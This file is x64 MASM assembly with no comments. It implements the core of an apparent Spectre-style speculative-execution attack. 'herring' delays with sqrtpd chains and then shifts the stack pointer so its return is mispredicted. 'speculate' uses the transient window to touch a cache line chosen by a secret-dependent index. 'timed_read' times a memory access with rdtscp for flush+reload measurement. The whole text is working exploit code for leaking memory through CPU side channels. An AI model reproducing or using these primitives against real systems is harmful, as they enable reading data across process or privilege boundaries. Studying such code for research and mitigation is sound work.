.code

herring	PROC
	xorps xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	sqrtpd xmm0, xmm0
	movd eax, xmm0
	lea rsp, [rsp+rax+8]
	ret
herring	ENDP

speculate	PROC PUBLIC
	mfence
	mov rsi, rcx
	call herring
	rdtsc
	and eax, 7
	or eax,32
	shl eax, 12
	movzx eax, byte ptr [rsi+rax]
speculate	ENDP

timed_read PROC PUBLIC
	push rdi
	mov rdi, rcx
	rdtscp
	shl rdx, 32
	or rax, rdx
	mov r8, rax
	mov al, [rdi]
	rdtscp
	shl rdx, 32
	or rax, rdx
	sub rax, r8
	pop rdi
	ret
timed_read ENDP

END
